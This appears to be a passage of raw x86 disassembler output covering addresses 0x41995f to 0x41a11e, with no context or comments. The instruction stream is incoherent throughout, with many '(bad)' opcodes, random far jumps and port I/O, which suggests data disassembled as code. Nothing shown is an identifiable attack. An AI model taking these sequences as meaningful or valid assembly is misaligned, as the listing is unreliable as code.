  41995f:	add    DWORD PTR [edx+0x3047dfcb],eax
  419965:	aaa    
  419966:	inc    esi
  419967:	pop    DWORD PTR es:[esp+ecx*4+0x38]
  41996c:	sbb    al,0x4a
  41996e:	aaa    
  41996f:	(bad)  [esi+0x70e0e031]
  419975:	hlt    
  419976:	shrd   DWORD PTR [edx-0x16],esp,0xe2
  41997b:	sub    DWORD PTR [ebx-0x49ead241],0x43dc094b
  419985:	gs retf 
  419987:	pushf  
  419988:	dec    esp
  419989:	mov    eax,ds:0xc81853e1
  41998e:	outs   dx,DWORD PTR ds:[esi]
  41998f:	jle    0x4199e4
  419991:	adc    bl,0xf7
  419994:	rol    BYTE PTR [ecx],1
  419996:	scas   al,BYTE PTR es:[edi]
  419997:	lods   eax,DWORD PTR ds:[esi]
  419998:	sbb    BYTE PTR [edx+0xf],bl
  41999b:	scas   al,BYTE PTR es:[edi]
  41999c:	mov    cl,BYTE PTR ds:0x7c192391
  4199a2:	pushf  
  4199a3:	adc    bh,BYTE PTR [edx-0x38e72f98]
  4199a9:	test   eax,0x6e8001f9
  4199ae:	pop    esp
  4199af:	sub    eax,0x337a29de
  4199b4:	or     BYTE PTR [ecx-0x51c96959],bl
  4199ba:	out    dx,al
  4199bb:	out    0xde,al
  4199bd:	pushf  
  4199be:	or     ch,0x6
  4199c1:	jnp    0x4199dd
  4199c3:	stc    
  4199c4:	inc    esi
  4199c5:	sahf   
  4199c6:	xchg   edi,eax
  4199c7:	jnp    0x41996b
  4199c9:	push   ss
  4199ca:	jl     0x419959
  4199cc:	add    ebp,DWORD PTR gs:[ebx]
  4199cf:	cli    
  4199d0:	mov    ebp,0x8c1c7fff
  4199d5:	test   ecx,edx
  4199d7:	xchg   ebx,eax
  4199d8:	mov    ebp,0xdb9874f7
  4199dd:	fldcw  WORD PTR [ecx]
  4199df:	aam    0x95
  4199e1:	add    al,0xf0
  4199e3:	aas    
  4199e4:	ja     0x419a42
  4199e6:	xor    BYTE PTR [edi+0x79fe49e5],ah
  4199ec:	icebp  
  4199ed:	and    eax,0x85c7a473
  4199f2:	out    dx,al
  4199f3:	mov    bh,0x3f
  4199f5:	and    BYTE PTR [eax],0x4f
  4199f8:	aad    0x47
  4199fa:	in     al,0x3a
  4199fc:	inc    eax
  4199fd:	sub    al,0xb5
  4199ff:	mov    ss,ebx
  419a01:	rcr    DWORD PTR [eax+0x323380b3],0xc0
  419a08:	xor    dl,BYTE PTR [edi]
  419a0a:	mov    ch,0x84
  419a0c:	pop    eax
  419a0d:	mov    ds:0x9b4f3237,eax
  419a12:	pop    ds
  419a13:	mov    bl,0xc7
  419a15:	aas    
  419a16:	mov    edi,0xd0cf0ff9
  419a1b:	jl     0x419a16
  419a1d:	mov    edx,0x42220332
  419a22:	inc    DWORD PTR [edi-0x7d]
  419a25:	vpmaxub xmm6,xmm1,XMMWORD PTR ds:[edi+0x523b95e6]
  419a2e:	loope  0x4199d1
  419a30:	(bad)  
  419a31:	pop    ds
  419a32:	fiadd  DWORD PTR [edi]
  419a34:	mov    eax,ds:0xd7739343
  419a39:	or     eax,0xd5aa0ed1
  419a3e:	or     esi,ebp
  419a40:	out    dx,al
  419a41:	or     eax,0x3e2ad49a
  419a46:	adc    eax,0x35445479
  419a4b:	mov    al,0x5c
  419a4d:	push   0x4dee88bf
  419a52:	pop    esi
  419a53:	(bad)  [eax+ecx*1-0x3df1b49b]
  419a5a:	or     DWORD PTR [edx+0x5f],0xeaff65ec
  419a61:	push   esp
  419a62:	cmp    eax,0x7638b1eb
  419a67:	cmp    DWORD PTR [ecx+ebx*4],eax
  419a6a:	push   edi
  419a6b:	(bad)  
  419a6c:	jecxz  0x419a66
  419a6e:	dec    edi
  419a6f:	sub    DWORD PTR [edi+0x68],0xffffffb8
  419a73:	mov    esi,0x76c32d41
  419a78:	(bad)  
  419a79:	stc    
  419a7a:	fwait
  419a7b:	or     BYTE PTR [ecx-0x20579d4b],al
  419a81:	fisttp QWORD PTR [eax-0x5a438eb6]
  419a87:	pusha  
  419a88:	mov    ebp,0x1138cf41
  419a8d:	(bad)  
  419a8e:	jnp    0x419ac0
  419a90:	mov    ch,0xb8
  419a92:	jle    0x419a92
  419a94:	xor    dl,BYTE PTR [edi]
  419a96:	sub    DWORD PTR [ecx-0x3b],ebp
  419a99:	gs sahf 
  419a9b:	add    DWORD PTR [ebp-0x60],0xeea7cf1a
  419aa2:	inc    edi
  419aa3:	dec    ecx
  419aa4:	push   0x42330c27
  419aa9:	in     al,dx
  419aaa:	jne    0x419a6a
  419aac:	pop    edi
  419aad:	out    dx,eax
  419aae:	call   0xae2f5ed9
  419ab3:	addr16 sub eax,0x4d0a54ac
  419ab9:	stos   DWORD PTR es:[edi],eax
  419aba:	inc    esi
  419abb:	inc    ebp
  419abc:	sub    bh,BYTE PTR fs:[edi+esi*4-0x47ba71b3]
  419ac4:	xor    BYTE PTR [esi+edx*8],ah
  419ac7:	and    eax,DWORD PTR [ecx]
  419ac9:	adc    ecx,ebp
  419acb:	sub    DWORD PTR [ebx+0x4a],esp
  419ace:	xchg   esp,eax
  419acf:	(bad)  
  419ad0:	xchg   DWORD PTR [eax-0x4ca68c86],esp
  419ad6:	fidiv  DWORD PTR [eax]
  419ad8:	cmp    ecx,eax
  419ada:	test   eax,0xff28c760
  419adf:	inc    eax
  419ae0:	xor    edx,DWORD PTR [ebx-0x2deea26e]
  419ae6:	or     DWORD PTR [eax-0x55049fda],ebx
  419aec:	add    edi,0xebc22739
  419af2:	lahf   
  419af3:	add    eax,0x2f870059
  419af8:	sub    ch,ch
  419afa:	les    eax,FWORD PTR [edx-0x65]
  419afd:	in     al,0xd7
  419aff:	lods   eax,DWORD PTR ds:[esi]
  419b00:	out    0x9b,al
  419b02:	adc    edx,ebp
  419b04:	(bad)
  419b07:	lods   eax,DWORD PTR ds:[esi]
  419b08:	or     al,0x1b
  419b0a:	push   ds
  419b0b:	test   BYTE PTR [ebx],cl
  419b0d:	fs sub edx,ecx
  419b10:	mov    BYTE PTR [ebp-0x13307868],bl
  419b16:	pop    edx
  419b17:	mov    al,0x1b
  419b19:	test   DWORD PTR ds:0x652a0c48,edi
  419b1f:	jecxz  0x419aa7
  419b21:	ins    DWORD PTR es:[edi],dx
  419b22:	xchg   BYTE PTR [edi],cl
  419b24:	aam    0x1d
  419b26:	leave  
  419b27:	xchg   DWORD PTR [edi+eax*4-0x20],edx
  419b2b:	stc    
  419b2c:	daa    
  419b2d:	stc    
  419b2e:	sahf   
  419b2f:	sbb    bl,BYTE PTR [ebx-0x6e]
  419b32:	(bad)  
  419b33:	cdq    
  419b34:	out    dx,al
  419b35:	xor    DWORD PTR [eax],0xce3c507a
  419b3b:	push   es
  419b3c:	inc    eax
  419b3d:	jmp    0x419adb
  419b3f:	aam    0x26
  419b41:	push   ss
  419b42:	and    cl,BYTE PTR [esi+0x2]
  419b45:	int    0x12
  419b47:	out    0x39,eax
  419b49:	jmp    0x98dcca44
  419b4e:	jmp    0x1a03:0xb9359589
  419b55:	add    al,0x76
  419b57:	jae    0x419add
  419b59:	sub    eax,0x1d433826
  419b5e:	mov    eax,ds:0xda9fc255
  419b63:	out    dx,al
  419b64:	jb     0x419b6f
  419b66:	(bad)  
  419b67:	in     eax,dx
  419b68:	enter  0x4a87,0xa7
  419b6c:	dec    ebx
  419b6d:	jbe    0x419b38
  419b6f:	mov    al,ds:0x47d16335
  419b74:	pusha  
  419b75:	push   edx
  419b76:	ins    BYTE PTR es:[edi],dx
  419b77:	cmc    
  419b78:	jmp    0x2020:0xbc87a62c
  419b7f:	retf   
  419b80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419b81:	retf   
  419b82:	add    al,0xe9
  419b84:	aas    
  419b85:	lock stos DWORD PTR es:[edi],eax
  419b87:	loop   0x419c00
  419b89:	(bad)  [edi-0x3278470c]
  419b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b90:	or     ch,BYTE PTR [ecx-0x21]
  419b93:	cmp    ah,BYTE PTR ds:0x98bd4b35
  419b99:	pop    ss
  419b9a:	and    dl,BYTE PTR [edi+0x40]
  419b9d:	loopne 0x419bac
  419b9f:	or     edi,DWORD PTR [ecx+eax*1]
  419ba2:	sub    dl,dl
  419ba4:	lods   al,BYTE PTR ds:[esi]
  419ba5:	lods   al,BYTE PTR ds:[esi]
  419ba6:	bound  ecx,QWORD PTR [edi+0x52298ac4]
  419bac:	sub    ebx,DWORD PTR [ebx]
  419bae:	add    al,0x7
  419bb0:	push   esi
  419bb1:	xchg   ecx,eax
  419bb2:	sbb    bl,0x9c
  419bb5:	jg     0x419bf9
  419bb7:	lahf   
  419bb8:	jns    0x419b9f
  419bba:	std    
  419bbb:	fsub   st,st(0)
  419bbd:	sbb    BYTE PTR [eax+0x2ca2f7e6],ah
  419bc3:	inc    esi
  419bc4:	push   cs
  419bc5:	loopne 0x419b7b
  419bc7:	xchg   ebp,eax
  419bc9:	aas    
  419bca:	push   cs
  419bcb:	fisub  DWORD PTR [edx]
  419bcd:	call   DWORD PTR [ebx+0x351ef390]
  419bd3:	push   edx
  419bd4:	mov    eax,0xc6f0a8fa
  419bd9:	sub    al,0x48
  419bdb:	add    ecx,0xe
  419bde:	adc    BYTE PTR [ebp+edx*4-0x137a0cdd],ch
  419be5:	mov    esp,0xcd23eff8
  419bea:	pop    edi
  419beb:	loopne 0x419c63
  419bed:	push   ds
  419bee:	or     al,0x8c
  419bf0:	push   edx
  419bf1:	mov    ebp,0xad1dce2f
  419bf6:	pop    esi
  419bf7:	test   BYTE PTR [eax],0x4c
  419bfa:	push   esi
  419bfb:	scas   eax,DWORD PTR es:[edi]
  419bfc:	dec    edx
  419bfd:	repnz (bad) 
  419c00:	pop    esp
  419c01:	syscall 
  419c03:	or     BYTE PTR [eax-0x75],bh
  419c06:	jecxz  0x419c79
  419c08:	mov    esi,0xf188c681
  419c0d:	xchg   ecx,eax
  419c0e:	dec    edi
  419c0f:	cmp    edi,eax
  419c11:	fldcw  WORD PTR [edi+edx*1]
  419c14:	mov    eax,ds:0xc24f1e6d
  419c19:	pushf  
  419c1a:	stos   BYTE PTR es:[edi],al
  419c1b:	aam    0x36
  419c1d:	or     DWORD PTR [edi+0x0],ebx
  419c20:	or     al,0x56
  419c22:	sub    ah,ah
  419c24:	push   eax
  419c25:	push   ss
  419c26:	cmp    BYTE PTR [edx+0xe],ah
  419c29:	jmp    0x2047:0x72effe88
  419c30:	push   ecx
  419c31:	adc    BYTE PTR [edx+ebp*1-0x39],ch
  419c35:	mov    ebp,0x56f5931
  419c3a:	int    0x7
  419c3c:	mov    edi,0xce3f2c55
  419c41:	test   eax,0xe93de401
  419c46:	pop    edi
  419c47:	repnz fadd DWORD PTR [esp+ebp*1+0x62]
  419c4c:	inc    sp
  419c4e:	aaa    
  419c4f:	mov    ?,WORD PTR [esi+0x10]
  419c52:	and    BYTE PTR [edx],dh
  419c54:	repz fmul DWORD PTR [ebp-0x10]
  419c58:	pop    ss
  419c59:	push   esp
  419c5a:	adc    dh,cl
  419c5c:	out    0xf5,eax
  419c5e:	in     al,dx
  419c5f:	mov    ds:0x26ae644d,eax
  419c64:	imul   eax,DWORD PTR [ebx+0x0],0xf5e250ab
  419c6b:	mov    al,0xe3
  419c6d:	cs pop esp
  419c6f:	mov    al,ds:0xe7acc8fc
  419c74:	mov    WORD PTR [ebx+0x62],ss
  419c77:	xchg   ebp,eax
  419c78:	sbb    al,0x4e
  419c7a:	stc    
  419c7b:	mov    eax,0x4dff632c
  419c80:	enter  0x9b0b,0xf8
  419c84:	int    0xcd
  419c86:	mov    eax,ds:0xf0b621e6
  419c8b:	mov    dh,0xe7
  419c8d:	loopne 0x419c11
  419c8f:	mov    BYTE PTR [ecx-0x27910255],0x3e
  419c96:	call   ecx
  419c98:	in     eax,dx
  419c99:	pop    ss
  419c9a:	adc    bh,BYTE PTR ds:0x21e21f21
  419ca0:	mov    eax,0x30bd3088
  419ca5:	je     0x419cb1
  419ca7:	adc    edi,DWORD PTR [ebp+0x36]
  419caa:	retf   0xf85c
  419cad:	and    eax,0x8aa2430b
  419cb2:	pushf  
  419cb3:	xor    BYTE PTR [esi-0x36],bh
  419cb6:	add    al,0x82
  419cb8:	aam    0xed
  419cba:	rcl    BYTE PTR [edi],cl
  419cbc:	cmp    BYTE PTR [esi],ah
  419cbe:	push   cs
  419cbf:	pop    ebx
  419cc0:	add    DWORD PTR [esp+edi*4],ebp
  419cc3:	adc    dl,cl
  419cc5:	dec    ebx
  419cc6:	inc    ebx
  419cc7:	lods   al,BYTE PTR ds:[esi]
  419cc8:	fwait
  419cc9:	adc    edi,DWORD PTR [esi-0x5cc5d688]
  419ccf:	mov    dl,0x7a
  419cd1:	add    eax,0x1e2f16f9
  419cd6:	sbb    al,BYTE PTR [esi+edi*4]
  419cd9:	pop    edx
  419cda:	push   eax
  419cdb:	add    al,0xec
  419cdd:	cmp    DWORD PTR [ecx+0x25],0xffffffd9
  419ce1:	jl     0x419c74
  419ce3:	or     edi,edx
  419ce5:	sub    eax,0x8ee96970
  419cea:	pusha  
  419ceb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cec:	xchg   ebp,eax
  419ced:	pushf  
  419cee:	jo     0x419cf2
  419cf0:	mov    BYTE PTR [edi],dl
  419cf2:	cs pusha 
  419cf4:	in     eax,0x56
  419cf6:	les    edx,FWORD PTR [esi]
  419cf8:	fwait
  419cf9:	cmp    eax,0x904a4176
  419cfe:	jae    0x419c9c
  419d00:	jl     0x419cf9
  419d02:	inc    esp
  419d03:	pop    ecx
  419d04:	dec    eax
  419d05:	fnsave [eax-0x38d56780]
  419d0b:	sub    DWORD PTR ds:0xbdf4d6bc,ebx
  419d11:	adc    al,0xb9
  419d13:	test   DWORD PTR [ebx-0x6],ebp
  419d16:	add    esi,ebp
  419d18:	aas    
  419d19:	add    eax,0x2930f0ac
  419d1e:	out    dx,eax
  419d1f:	jmp    0x208a:0x8ea7a06a
  419d26:	ins    BYTE PTR es:[edi],dx
  419d27:	jecxz  0x419cf4
  419d29:	das    
  419d2a:	mov    dl,0x6a
  419d2c:	into   
  419d2d:	mov    cl,0x94
  419d2f:	add    eax,0xc3cbacae
  419d34:	inc    ebx
  419d35:	mov    ebx,0x1755d775
  419d3a:	sub    DWORD PTR [eax],edi
  419d3c:	push   0x71c49112
  419d41:	(bad)  
  419d42:	and    al,0x73
  419d44:	fsubr  QWORD PTR [eax-0x37]
  419d47:	inc    eax
  419d48:	or     eax,0xe7297db6
  419d4d:	mov    bh,0x32
  419d4f:	cdq    
  419d50:	push   0xffffffd9
  419d52:	fist   DWORD PTR [ecx-0x31]
  419d55:	fst    st(2)
  419d57:	inc    eax
  419d58:	out    0xa9,eax
  419d5a:	int3   
  419d5b:	aad    0x4c
  419d5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d5e:	test   DWORD PTR [edi+0x4e],0xffe63be6
  419d65:	push   0x44
  419d67:	div    DWORD PTR [eax]
  419d69:	ficom  WORD PTR [eax-0x7bc80c21]
  419d6f:	xor    ch,ah
  419d71:	nop
  419d72:	popf   
  419d73:	out    dx,eax
  419d74:	or     edx,esi
  419d76:	pop    edi
  419d77:	mov    ?,WORD PTR [esi]
  419d79:	popa   
  419d7a:	stc    
  419d7b:	cmp    ecx,ecx
  419d7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d7e:	xor    esi,ecx
  419d80:	add    dh,BYTE PTR [ebp-0x75648a6d]
  419d86:	mov    dl,0x6a
  419d88:	mov    ecx,DWORD PTR [eax+ebx*4]
  419d8b:	pop    ss
  419d8c:	je     0x419dc6
  419d8e:	cmp    eax,0xe2a4af6
  419d93:	cld    
  419d94:	xchg   DWORD PTR [ecx],ebp
  419d96:	add    eax,0x7af04487
  419d9b:	test   ch,ch
  419d9d:	rcl    DWORD PTR [edx-0x37],cl
  419da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419da1:	and    BYTE PTR [ebx],bl
  419da3:	xor    eax,0x2b208666
  419da8:	xchg   edi,eax
  419da9:	dec    ebp
  419daa:	pop    edx
  419dab:	ds scas al,BYTE PTR es:[edi]
  419dad:	mov    ebx,0x7189442
  419db2:	loop   0x419db9
  419db4:	mov    esp,0x7514f179
  419db9:	inc    edx
  419dba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419dbb:	adc    esi,DWORD PTR [edi-0x72]
  419dbe:	das    
  419dbf:	pop    es
  419dc0:	jbe    0x419e1b
  419dc2:	sbb    ch,al
  419dc4:	clc    
  419dc5:	sub    BYTE PTR [ecx+0x1c],0x38
  419dc9:	sbb    eax,0xf2bcebe3
  419dce:	add    BYTE PTR [esi-0x62],al
  419dd1:	mov    al,0x9
  419dd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dd4:	(bad)  
  419dd5:	ja     0x419daf
  419dd7:	and    DWORD PTR [ecx+0x6d],edi
  419dda:	mov    ch,0x46
  419ddc:	mov    ds:0xf9e87ccd,al
  419de1:	je     0xfa64a972
  419de7:	adc    DWORD PTR [edi],ebx
  419de9:	dec    esp
  419dea:	sub    cl,BYTE PTR [esi+ecx*4-0x873ae40]
  419df1:	mov    bh,0xe3
  419df3:	adc    BYTE PTR [edi-0x80],cl
  419df6:	rol    DWORD PTR fs:[esi+0x74],0xfb
  419dfb:	pop    ss
  419dfc:	xchg   edi,eax
  419dfd:	push   cs
  419dfe:	xor    eax,0xbf2b4181
  419e03:	xor    bh,BYTE PTR [ebp-0x5a12d972]
  419e09:	test   DWORD PTR [ecx+0x5e09fa88],edi
  419e0f:	xchg   esp,eax
  419e10:	mov    ds:0x682cd9b7,eax
  419e15:	aas    
  419e16:	(bad)  
  419e17:	add    eax,ebx
  419e19:	or     eax,0xbcb1b9f
  419e1e:	jecxz  0x419e29
  419e20:	jbe    0x419e45
  419e22:	jp     0x419dea
  419e24:	dec    esi
  419e25:	xlat   BYTE PTR ds:[ebx]
  419e26:	test   BYTE PTR [eax-0x70],cl
  419e29:	popa   
  419e2a:	dec    edx
  419e2b:	mov    ch,0x7f
  419e2d:	sbb    BYTE PTR [ecx-0x3],bh
  419e30:	sub    DWORD PTR [edx+0x24],0xfffffffe
  419e34:	push   ss
  419e35:	pushf  
  419e36:	jmp    0x74b5cc83
  419e3b:	add    ebx,DWORD PTR ds:0x4022e7df
  419e41:	or     BYTE PTR [edi+0x59ef2f3c],bl
  419e47:	int    0xe9
  419e49:	scas   al,BYTE PTR es:[edi]
  419e4a:	das    
  419e4b:	push   eax
  419e4c:	fdiv   DWORD PTR [edx-0x51]
  419e4f:	mov    ebx,0x91f6eea5
  419e54:	loope  0x419e0b
  419e56:	push   ebp
  419e57:	int3   
  419e58:	cmp    eax,0xd0c9ea51
  419e5d:	pop    ecx
  419e5e:	sahf   
  419e5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e60:	mov    edx,esp
  419e62:	mov    cl,0x12
  419e64:	or     cl,cl
  419e66:	test   eax,0x5cb74fa9
  419e6b:	sbb    DWORD PTR [esi],ebp
  419e6d:	pop    esi
  419e6e:	or     al,0x26
  419e70:	ret    
  419e71:	imul   edi,DWORD PTR [eax-0x4be934bf],0xf692a753
  419e7b:	aad    0xc9
  419e7d:	aas    
  419e7e:	fcomp  QWORD PTR [esi]
  419e80:	mov    eax,ds:0x416a1b5e
  419e85:	ja     0x419ed7
  419e87:	dec    esp
  419e88:	loope  0x419e90
  419e8a:	fnstenv [ecx+0x67a5c782]
  419e90:	retf   0x8db
  419e93:	sbb    eax,0x7a063c84
  419e98:	xchg   BYTE PTR [ebp+0x64c942ae],ah
  419e9e:	mov    bh,0x82
  419ea0:	ror    dh,1
  419ea2:	push   ebx
  419ea3:	xchg   DWORD PTR [edx],esi
  419ea5:	stos   DWORD PTR es:[edi],eax
  419ea6:	pushf  
  419ea7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ea8:	add    al,0x31
  419eaa:	or     dl,cl
  419eac:	jo     0x419e49
  419eae:	sbb    DWORD PTR [edx-0x624ff848],esp
  419eb4:	popa   
  419eb5:	cmp    BYTE PTR ds:0x5f5bb508,cl
  419ebb:	and    cl,BYTE PTR [esi+0x17]
  419ebe:	js     0x419e72
  419ec0:	mov    dh,0x43
  419ec2:	gs jg  0x419ef9
  419ec5:	sbb    eax,DWORD PTR [edx+0x1b]
  419ec8:	add    esi,DWORD PTR [esi-0x78443b01]
  419ece:	or     eax,0xdb628b51
  419ed3:	call   0x14cd3b37
  419ed8:	mov    cl,0x57
  419eda:	(bad)  
  419edb:	fstp   QWORD PTR [ecx]
  419edd:	loopne 0x419f58
  419edf:	adc    edx,DWORD PTR [ebp+edx*2-0x1eb949f4]
  419ee6:	push   cs
  419ee7:	push   es
  419ee8:	jnp    0x419ec8
  419eea:	jnp    0x419e99
  419eec:	xchg   ebx,eax
  419eed:	pop    ds
  419eee:	mov    ch,0x27
  419ef0:	inc    ebx
  419ef1:	push   edi
  419ef2:	fld    TBYTE PTR [ecx]
  419ef4:	jbe    0x419f50
  419ef6:	pop    edi
  419ef7:	inc    esp
  419ef8:	loop   0x419f65
  419efa:	nop
  419efb:	(bad)  
  419efd:	hlt    
  419efe:	shr    ebx,0x7
  419f01:	mov    cl,0x4e
  419f03:	inc    eax
  419f04:	frstor [edi+0x2e689d35]
  419f0a:	dec    ecx
  419f0b:	jp     0x419f3a
  419f0d:	pop    ebx
  419f0e:	fdiv   DWORD PTR [edi-0x20]
  419f11:	clc    
  419f12:	inc    edx
  419f13:	lea    edi,[ecx]
  419f15:	push   cs
  419f16:	inc    esi
  419f17:	xchg   ecx,eax
  419f18:	pop    eax
  419f19:	cwde   
  419f1a:	sbb    DWORD PTR [esi-0xa],ecx
  419f1d:	dec    edx
  419f1e:	imul   ebp,DWORD PTR [ebp-0x8],0x4f806062
  419f25:	ins    BYTE PTR es:[edi],dx
  419f26:	hlt    
  419f27:	ffree  st(4)
  419f29:	jnp    0x419f56
  419f2b:	(bad)
  419f2e:	pop    ds
  419f2f:	push   ebp
  419f30:	je     0x419f85
  419f32:	dec    ebp
  419f33:	adc    cl,BYTE PTR [edi-0x4f]
  419f36:	inc    esp
  419f37:	mov    WORD PTR [ecx+0x461f8bf8],gs
  419f3d:	cmp    ch,BYTE PTR [ebx]
  419f3f:	sub    edi,esp
  419f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f42:	push   ecx
  419f43:	inc    eax
  419f44:	push   ebx
  419f45:	out    0x96,eax
  419f47:	xor    al,cl
  419f49:	clc    
  419f4a:	aaa    
  419f4b:	dec    esp
  419f4c:	dec    BYTE PTR [esi]
  419f4e:	imul   edx,DWORD PTR ds:0x3cd3a5d8,0xfffffffb
  419f55:	ficomp DWORD PTR [ebx+0x1ed67780]
  419f5b:	fcom   DWORD PTR [edi]
  419f5d:	stos   DWORD PTR es:[edi],eax
  419f5e:	mov    esp,0xe8c4a9fe
  419f63:	mov    ah,0x8d
  419f65:	std    
  419f66:	add    DWORD PTR [esi+0x723dea23],0xffffff8d
  419f6d:	dec    ebx
  419f6e:	dec    ebx
  419f6f:	out    0xf5,eax
  419f71:	mov    eax,0x6f0abd24
  419f76:	sub    ebx,DWORD PTR [eax+0x5003cef3]
  419f7c:	pop    cx
  419f7e:	inc    edx
  419f7f:	inc    edi
  419f80:	jmp    0x419f49
  419f82:	cmp    BYTE PTR [ecx-0x640f67d7],ch
  419f88:	sub    BYTE PTR [ebx],cl
  419f8a:	or     eax,ebp
  419f8c:	push   ebp
  419f8d:	cmc    
  419f8e:	je     0x4ae6ee89
  419f94:	ds ss pop edx
  419f97:	jns    0x419f80
  419f99:	xor    bh,BYTE PTR [ecx]
  419f9b:	fdivr  DWORD PTR ds:0x77d45007
  419fa1:	das    
  419fa2:	aas    
  419fa3:	inc    ebp
  419fa4:	add    BYTE PTR [eax+0x7375fee3],0xaf
  419fab:	iret   
  419fac:	(bad)  
  419fad:	jno    0x419fcf
  419faf:	dec    ebp
  419fb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb1:	clc    
  419fb2:	or     eax,0x6e7499db
  419fb7:	fsubp  st(6),st
  419fb9:	mov    ebx,?
  419fbb:	imul   esi,DWORD PTR [esi-0x73],0x3990a6e8
  419fc2:	les    edx,FWORD PTR ds:0xe3e02709
  419fc8:	and    BYTE PTR [edi],bl
  419fca:	push   0x51
  419fcc:	dec    BYTE PTR ds:0x48ea7bb5
  419fd2:	sbb    eax,0x276eb488
  419fd7:	in     al,dx
  419fd8:	aam    0x58
  419fda:	mov    dh,BYTE PTR [ebx-0x2884fee3]
  419fe0:	dec    ecx
  419fe1:	les    edx,FWORD PTR [edx-0xf0c7ef2]
  419fe7:	fst    DWORD PTR [esi]
  419fe9:	mov    bh,0xf
  419feb:	cmc    
  419fec:	mov    edx,0xd4503470
  419ff1:	or     DWORD PTR [ebp+edi*1+0x53],esi
  419ff5:	outs   dx,BYTE PTR ds:[esi]
  419ff6:	cs jno 0x41a031
  419ff9:	mov    ecx,0xb3825a4d
  419ffe:	mov    ebx,ebx
  41a000:	jns    0x419fa9
  41a002:	fcomp  QWORD PTR [edx+0x7]
  41a005:	mov    ds:0xde0e9dfb,al
  41a00a:	cmc    
  41a00b:	jns    0x41a026
  41a00d:	cld    
  41a00e:	(bad)  
  41a00f:	xchg   edi,eax
  41a010:	jo     0x41a01f
  41a012:	dec    esp
  41a013:	dec    edi
  41a014:	fisttp DWORD PTR fs:[edx+0x68]
  41a018:	or     DWORD PTR [edi-0x6f],0xfffffffa
  41a01c:	fimul  WORD PTR [ebx-0x60a73745]
  41a022:	add    al,BYTE PTR [ebp+ebx*4+0x5ce44909]
  41a029:	loopne 0x41a051
  41a02b:	mov    ch,0x5e
  41a02d:	fidiv  WORD PTR [esi]
  41a02f:	shr    DWORD PTR [edx+0x1e],cl
  41a032:	push   0x54
  41a034:	inc    esi
  41a035:	cwde   
  41a036:	inc    edx
  41a037:	mov    al,ds:0xb9f2485e
  41a03c:	jb     0x41a0aa
  41a03e:	or     ebx,DWORD PTR [ebx+edi*4]
  41a041:	xchg   ecx,eax
  41a042:	adc    al,0xe
  41a044:	ja     0x419ff4
  41a046:	jg     0x41a0a7
  41a048:	shl    DWORD PTR cs:[esi],cl
  41a04b:	popa   
  41a04c:	sbb    BYTE PTR [eax-0x3a8c6cf2],dh
  41a052:	ret    0x7b00
  41a055:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a056:	ds pop esp
  41a058:	das    
  41a059:	jo     0x41a032
  41a05b:	and    dh,BYTE PTR [edx]
  41a05d:	or     bl,ch
  41a05f:	stos   DWORD PTR es:[edi],eax
  41a060:	push   cs
  41a061:	jle    0x41a01e
  41a063:	cmp    DWORD PTR [esi+0x50f925e],edi
  41a069:	sub    al,BYTE PTR [ecx]
  41a06b:	xor    dl,BYTE PTR [edi-0x3dd9abec]
  41a071:	xchg   BYTE PTR [ecx+esi*1-0x122304e7],bh
  41a078:	call   0x7ec9:0x81f4c3d6
  41a07f:	sbb    edi,DWORD PTR [esi+0x23e2d84b]
  41a085:	mov    cl,0xed
  41a087:	pop    edi
  41a088:	out    0x6,eax
  41a08a:	imul   edx,DWORD PTR [edx+0x30230b2b],0xffffff92
  41a091:	ret    0xffc9
  41a094:	xor    eax,0x2b9636b8
  41a099:	xchg   edi,eax
  41a09a:	ret    
  41a09b:	sbb    ecx,DWORD PTR [ebx]
  41a09d:	push   ds
  41a09e:	mov    dl,0xdd
  41a0a0:	scas   al,BYTE PTR es:[edi]
  41a0a1:	mov    ebx,0x3fc028b2
  41a0a6:	aam    0xba
  41a0a8:	mov    al,ds:0x6b9645ce
  41a0ad:	(bad)  
  41a0ae:	sbb    al,0x82
  41a0b0:	mov    ds:0x67632ba9,al
  41a0b5:	shl    DWORD PTR [esi],cl
  41a0b7:	pop    ss
  41a0b8:	jl     0x41a0a6
  41a0ba:	inc    ecx
  41a0bb:	dec    esp
  41a0bc:	inc    eax
  41a0bd:	dec    ebp
  41a0be:	xchg   esp,eax
  41a0bf:	jns    0x41a0d0
  41a0c1:	mov    eax,ds:0xea42c9b2
  41a0c6:	ds cdq 
  41a0c8:	cwde   
  41a0c9:	lahf   
  41a0ca:	xor    eax,0x35
  41a0cd:	dec    esi
  41a0ce:	idiv   ah
  41a0d0:	push   eax
  41a0d1:	xchg   ebp,eax
  41a0d2:	(bad)  
  41a0d3:	fwait
  41a0d4:	sti    
  41a0d5:	imul   edx,edx,0x2b
  41a0d8:	shl    BYTE PTR [esi+eiz*4-0x49],0xd7
  41a0dd:	out    dx,eax
  41a0de:	or     al,0x67
  41a0e0:	test   eax,0x1f377a51
  41a0e5:	(bad)  
  41a0e6:	push   ebx
  41a0e7:	fmul   QWORD PTR [ecx-0x25b1c24d]
  41a0ed:	cmc    
  41a0ee:	and    cl,0x2
  41a0f1:	jnp    0x41a162
  41a0f3:	xchg   ecx,eax
  41a0f4:	pop    ss
  41a0f5:	(bad)  
  41a0f6:	and    eax,0x21f94a74
  41a0fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a0fc:	xlat   BYTE PTR ds:[ebx]
  41a0fd:	mov    dh,0x81
  41a0ff:	mov    edx,0xb5bd0a06
  41a104:	mov    al,ds:0x93eb63e0
  41a109:	fisttp QWORD PTR [ebx]
  41a10b:	jbe    0x41a0db
  41a10d:	sbb    esp,esp
  41a10f:	mov    edx,0x4e821586
  41a114:	xchg   ebp,eax
  41a115:	and    ecx,0x5d
  41a118:	and    eax,0x479ac8e1
  41a11d:	push   eax
  41a11e:	fidivr DWORD PTR [esi-0x61b00148]
